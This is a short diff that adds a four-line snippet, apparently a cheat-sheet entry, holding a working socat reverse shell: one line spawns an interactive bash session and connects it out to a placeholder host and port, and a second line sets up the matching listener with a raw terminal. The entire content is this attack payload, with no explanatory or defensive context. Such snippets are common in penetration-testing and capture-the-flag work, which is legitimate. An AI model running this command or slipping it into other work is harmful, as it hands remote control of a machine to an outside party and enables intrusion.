@@ -1,0 +1,4 @@
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
+
+listener:
+socat file:`tty`,raw,echo=0 TCP-L:$port
